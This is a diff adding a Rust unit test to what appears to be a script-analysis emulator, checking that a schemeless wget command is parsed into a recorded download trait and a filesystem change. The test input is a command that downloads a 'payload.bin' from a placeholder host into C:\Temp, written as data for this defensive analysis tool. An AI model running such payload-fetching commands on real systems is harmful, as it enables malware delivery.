@@ -6911,6 +6911,35 @@ mod wget_tests {
     }
 
     #[test]
+    fn wget_schemeless_domain_path_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget wget-schemeless.example/payload.bin -O C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "http://wget-schemeless.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
     fn wget_attached_long_output_option_is_case_insensitive() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
